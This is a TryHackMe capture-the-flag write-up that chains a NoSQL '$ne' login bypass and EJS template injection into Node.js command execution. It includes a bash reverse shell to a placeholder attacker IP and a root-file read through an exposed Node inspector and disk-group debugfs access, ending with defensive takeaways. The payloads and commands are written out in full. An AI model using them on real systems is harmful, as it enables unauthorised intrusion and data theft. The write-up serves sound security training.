# Do Not Disturb – TryHackMe Writeup

**Category:** Boot2Root / Web
**Difficulty:** Medium

## Objective

* Obtain the **user flag**
* Obtain the **root flag**

---

# Enumeration

A quick scan identified the target's HTTP service.

```bash
nmap -sC -sV <TARGET_IP>
```

The web application presented a login page for the **Byte Lotus Poolside** staff portal.

---

# Initial Access

## NoSQL Injection Authentication Bypass

Intercept the login request using Burp Suite and modify the POST parameters:

```text
username=attendant
password[$ne]=x
```

Since the backend uses NeDB (MongoDB-like queries), the `$ne` operator bypasses authentication by matching any password that is **not** `"x"`.

Successful authentication grants access to the **/staff** page.

---

# Server-Side Template Injection (SSTI)

The staff dashboard allows custom EJS templates:

```ejs
Dear <%= guest %>, your Byte Lotus cabana is confirmed.
```

Testing with:

```ejs
<%= 7*7 %>
```

confirmed SSTI.

---

# Remote Code Execution

Node.js code execution was achieved using:

```ejs
<%= global.process.mainModule.require('child_process').execSync('id') %>
```

Output:

```text
uid=996(poolside) gid=996(poolside)
```

---

# Reverse Shell

A Bash reverse shell was executed through the SSTI:

```ejs
<%= global.process.mainModule.require('child_process').execSync("bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'") %>
```

Listener:

```bash
nc -lvnp 4444
```

A shell was obtained as:

```text
poolside
```

---

# User Flag

Locate the flag:

```bash
find / -name user.txt 2>/dev/null
```

Output:

```text
/home/poolside/user.txt
```

Read the flag:

```bash
cat /home/poolside/user.txt
THM{REDACTED}
```

---

# Privilege Escalation

## Process Enumeration

After obtaining a shell as the `poolside` user, enumerate the running processes:

```bash
ps -e -o pid,ppid,state,command
```

Among the running processes, an unusual Node.js instance stood out:

```text
/usr/bin/node --inspect=127.0.0.1:9229 processor.js
```

The `--inspect` flag indicates that the **Node.js Inspector** is enabled, exposing a debugging interface locally.

Confirm the process details:

```bash
pgrep -af 'processor.js|telemetry'

ps -eo user,pid,ppid,args | grep -E 'processor.js|telemetry' | grep -v grep
```

Output:

```text
pipelinesvc 1554 /usr/bin/node --inspect=127.0.0.1:9229 processor.js
```

---

## Confirm the Inspector Service

Verify that the debugger is listening:

```bash
ss -tuln
```

Relevant output:

```text
tcp LISTEN 0 511 127.0.0.1:9229
```

This confirms that the Node Inspector is only accessible locally.

---

## Connect to the Node Inspector

Use Node's built-in debugger:

```bash
node inspect 127.0.0.1:9229
```

Switch to the JavaScript REPL:

```text
repl
```

Verify the execution context:

```javascript
process.getuid()
process.getgid()
process.cwd()
```

Output:

```text
995
995
/opt/pipelinesvc/telemetry
```

The debugger is executing JavaScript inside the **pipelinesvc** process.

---

## Execute Commands as pipelinesvc

Node.js v22 provides access to built-in modules through `process.getBuiltinModule()`.

Execute arbitrary system commands:

```javascript
process.getBuiltinModule('child_process').execSync('id').toString()
```

Output:

```text
uid=995(pipelinesvc)
gid=995(pipelinesvc)
groups=995(pipelinesvc),6(disk)
```

The important discovery is that **pipelinesvc belongs to the `disk` group**.

---

## Enumerate Disk Access

List the available block devices:

```javascript
process.getBuiltinModule('child_process').execSync(
"ls -l /dev/sd* /dev/vd* /dev/nvme* /dev/mapper/* 2>/dev/null || true"
).toString()
```

The root filesystem is located on:

```text
/dev/nvme0n1p1
```

---

## Read the Root Flag

Because members of the **disk** group have raw access to block devices, the root filesystem can be accessed directly using **debugfs**.

Execute:

```javascript
process.getBuiltinModule('child_process').execSync(
"/usr/sbin/debugfs -R 'cat /root/root.txt' /dev/nvme0n1p1 2>/dev/null"
).toString()
```

Output:

```text
THM{REDACTED}
```

The root flag is successfully retrieved without needing a traditional root shell.

---

# Attack Chain

```text
NoSQL Injection
        │
        ▼
Authentication Bypass
        │
        ▼
Staff Dashboard
        │
        ▼
EJS SSTI
        │
        ▼
Node.js Remote Code Execution
        │
        ▼
Reverse Shell (poolside)
        │
        ▼
Process Enumeration
        │
        ▼
Exposed Node Inspector
        │
        ▼
JavaScript Execution as pipelinesvc
        │
        ▼
Discovery of disk Group Membership
        │
        ▼
Raw Disk Access via debugfs
        │
        ▼
Read /root/root.txt
```

# Key Takeaways

* Avoid constructing database queries directly from user input, as operator injection (`$ne`) can bypass authentication.
* Never render untrusted user input using server-side template engines such as EJS.
* The Node.js Inspector should never be exposed on production systems, even if bound to localhost, as local code execution can abuse it.
* Membership of privileged groups such as **disk** can be as dangerous as full root access, allowing direct reads of sensitive filesystem data through raw block devices.

* Exposing the Node.js Inspector (`--inspect`) significantly increases attack surface and should never be enabled on production systems.
* Sensitive background services should not expose debugging interfaces or execute writable code paths.
